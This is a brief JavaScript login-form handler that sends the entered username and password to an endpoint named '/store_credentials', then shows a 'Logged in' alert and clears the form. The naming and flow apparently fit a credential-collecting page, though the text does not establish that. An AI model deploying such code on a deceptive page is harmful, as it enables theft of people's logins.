document.getElementById('loginForm').addEventListener('submit', function (e) {
    e.preventDefault();
  
    const username = e.target.username.value;
    const password = e.target.password.value;
  
    fetch('/store_credentials', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    })
    .then(res => res.json())
    .then(data => {
      alert(data.message || 'Logged in');
      e.target.reset();
    })
    .catch(err => {
      console.error('Error:', err);
    });
  });
  